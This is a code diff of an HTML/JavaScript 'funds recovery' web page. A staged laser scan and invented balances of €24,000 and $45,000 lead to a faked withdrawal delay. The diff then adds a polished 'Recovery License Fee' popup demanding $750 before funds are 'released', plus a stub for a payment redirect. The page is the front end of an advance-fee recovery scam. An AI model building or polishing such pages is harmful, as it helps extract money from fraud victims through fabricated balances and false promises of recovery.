@@ -52,15 +52,18 @@
   }
   .modal-content {
     background:#1e1e1e;padding:25px;border-radius:12px;text-align:center;
-    max-width:320px;box-shadow:0 4px 12px rgba(0,0,0,0.3);
-    animation: fadeIn 0.4s ease;
+    max-width:340px;box-shadow:0 4px 12px rgba(0,0,0,0.3);
+    animation: snookFade 0.6s ease;
   }
-  @keyframes fadeIn {from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+  @keyframes snookFade {
+    from {opacity:0; transform:scale(0.95) translateY(20px);}
+    to {opacity:1; transform:scale(1) translateY(0);}
+  }
   input,select {
     width:100%;padding:10px;margin:8px 0;border-radius:8px;border:none;
     background:#2a2a2a;color:#fff;
   }
-  /* Professional laser scan */
+  /* Laser scan */
   .scan-area {
     position: relative;
     width: 100%;
@@ -142,6 +145,26 @@
   </div>
 </div>
 
+<!-- Fee Popup Modal -->
+<div class="modal" id="feeModal">
+  <div class="modal-content">
+    <div style="font-size:40px; color:#00ffc8; margin-bottom:10px;">🛡️</div>
+    <h3 style="color:#00ffc8; margin-top:0;">Recovery License Fee</h3>
+    <p style="font-size:15px; line-height:1.6; color:#ddd;">
+      To complete your recovery and unlock full withdrawal functionality, a one‑time
+      <strong style="color:#fff;">license fee of $750</strong> is required.
+    </p>
+    <p style="font-size:14px; color:#00ffc8; margin-top:15px; font-weight:600;">
+      ✅ Once payment is confirmed, your recovery will be released immediately and funds will be available for withdrawal.
+    </p>
+    <p style="font-size:13px; color:#aaa; margin-top:10px;">
+      This verification ensures compliance and secures your recovered funds.
+    </p>
+    <button class="btn" onclick="proceedFee()">Proceed to Payment</button>
+    <button class="btn" style="background:#444; color:#fff;" onclick="closeFee()">Cancel</button>
+  </div>
+</div>
+
 <script>
   const greeting=document.getElementById('greeting');
   const balance=document.getElementById('balance');
@@ -149,6 +172,7 @@
   const scanModal=document.getElementById('scanModal');
   const resultModal=document.getElementById('resultModal');
   const withdrawModal=document.getElementById('withdrawModal');
+  const feeModal=document.getElementById('feeModal');
   const activateBtn=document.getElementById('activateBtn');
   const claimBtn=document.getElementById('claimBtn');
   const withdrawBtn=document.getElementById('withdrawBtn');
@@ -172,61 +196,83 @@
     const oscillator=ctx.createOscillator();
     const gainNode=ctx.createGain();
     oscillator.type="sine";
-    oscillator.frequency.setValueAtTime(800,ctx.currentTime); // beep frequency
+    oscillator.frequency.setValueAtTime(800,ctx.currentTime);
     gainNode.gain.setValueAtTime(0.1,ctx.currentTime);
     oscillator.connect(gainNode);
     gainNode.connect(ctx.destination);
     oscillator.start();
-    oscillator.stop(ctx.currentTime+0.2); // short beep
+    oscillator.stop(ctx.currentTime+0.2);
   }
 
-  function startRecovery(){
-    scanModal.style.display='flex';
-    let passes=0;
-    const laserArea=document.getElementById('laserArea');
-    laserArea.innerHTML='';
-    function runLaser(){
-      const laser=document.createElement('div');
-      laser.className='laser-line';
-      laserArea.appendChild(laser);
-      playBeep(); // play beep each pass
-      laser.addEventListener('animationend',()=>{
-        laser.remove();
-        passes++;
-        if(passes<6){runLaser();}
-        else{
-          scanModal.style.display='none';
-          resultModal.style.display='flex';
-          claimBtn.disabled=false;
-        }
-      });
+      function startRecovery(){
+      scanModal.style.display='flex';
+      let passes=0;
+      const laserArea=document.getElementById('laserArea');
+      laserArea.innerHTML='';
+      function runLaser(){
+        const laser=document.createElement('div');
+        laser.className='laser-line';
+        laserArea.appendChild(laser);
+        playBeep();
+        laser.addEventListener('animationend',()=>{
+          laser.remove();
+          passes++;
+          if(passes<6){
+            runLaser();
+          } else {
+            scanModal.style.display='none';
+            resultModal.style.display='flex';
+            claimBtn.disabled=false;
+          }
+        });
+      }
+      runLaser();
     }
-    runLaser();
-  }
 
-  function closeResult(){resultModal.style.display='none';}
-  function claimRecovery(){
-    balance.textContent='$45,000.00';
-    claimBtn.disabled=true;
-    withdrawBtn.disabled=false;
-  }
-
-  function startWithdraw(){withdrawModal.style.display='flex';}
-  function confirmWithdraw(){
-    withdrawStatus.innerHTML='<p>Processing withdrawal...</p>';
-    setTimeout(()=>{
-      withdrawStatus.innerHTML='<p style="color:red;">Error: $750 fee required for full recovery verification.</p>';
-    },25000);
-  }
-
-  window.onload=()=>{
-    const name=localStorage.getItem('userName');
-    if(name){
-      greeting.textContent=`Welcome, ${name}!`;
-      balance.textContent='€24,000.00';
-      activateBtn.disabled=false;
+    function closeResult(){
+      resultModal.style.display='none';
     }
-  };
-</script>
+
+    function claimRecovery(){
+      balance.textContent='$45,000.00';
+      claimBtn.disabled=true;
+      withdrawBtn.disabled=false;
+    }
+
+    function startWithdraw(){
+      withdrawModal.style.display='flex';
+    }
+
+    function confirmWithdraw(){
+      withdrawStatus.innerHTML='<p>Processing withdrawal...</p>';
+      setTimeout(()=>{
+        withdrawModal.style.display='none';
+        showFeePopup();
+      },25000);
+    }
+
+    function showFeePopup(){
+      feeModal.style.display='flex';
+    }
+
+    function closeFee(){
+      feeModal.style.display='none';
+    }
+
+    function proceedFee(){
+      alert("Redirecting to secure payment gateway...");
+      // Integrate payment API or redirect here
+    }
+
+    window.onload=()=>{
+      const name=localStorage.getItem('userName');
+      if(name){
+        greeting.textContent=`Welcome, ${name}!`;
+        balance.textContent='€24,000.00';
+        activateBtn.disabled=false;
+      }
+    };
+  </script>
 </body>
 </html>
+
